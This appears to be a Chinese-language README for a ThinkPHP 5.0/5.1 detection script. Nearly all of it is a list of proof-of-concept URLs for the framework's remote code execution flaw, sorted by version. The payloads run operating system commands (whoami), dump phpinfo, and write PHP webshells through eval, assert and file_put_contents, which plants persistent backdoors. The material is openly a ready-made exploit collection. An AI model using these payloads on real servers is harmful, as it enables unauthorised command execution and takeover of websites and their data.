# thinkphp
thinkphp代码：
Thinkphp5.0.X系列检测脚本。
参考的payload:
如果不是用python测试的话，那么就要把里面的双反斜杠换为单反斜杠
互联网上面收集的poc
1、利用system函数远程命令执行

http://localhost/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami

2.通过phpinfo函数写出phpinfo()的信息

http://localhost/public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

3.写入shell:

http://localhost/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo ^<?php @eval($_GET["code"])?^>>shell.php

http://localhost/thinkphp5.1/html/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=../test.php&vars[1][]=<?php?echo?'ok';?>

/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET['fuck']);&fuck=phpinfo();

/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET['fuck']);&fuck=eval($_POST[ian]);

/public/index.php?s=index/\think\Container/invokefunction&function=call_user_func&vars[0]=phpinfo&vars[1]=1


POC

TP版本5.0.21：

http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami

http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

TP版本5.0.22：
http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami

http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
TP5.1.*

thinkphp5.1.29为例
1、代码执行:
http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&filter=phpinfo&data=1
2、命令执行:
http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&filter=system&data=操作系统命令
3、文件写入（写shell）：
http://url/to/thinkphp5.1.29/?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E
4、未知:
http://url/to/thinkphp5.1.29/?s=index/\think\view\driver\Php/display&content=%3C?php%20phpinfo();?%3E
5、代码执行:
http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
6、命令执行:
http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=操作系统命令
7、代码执行:
http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
8、命令执行:
http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=操作系统命令
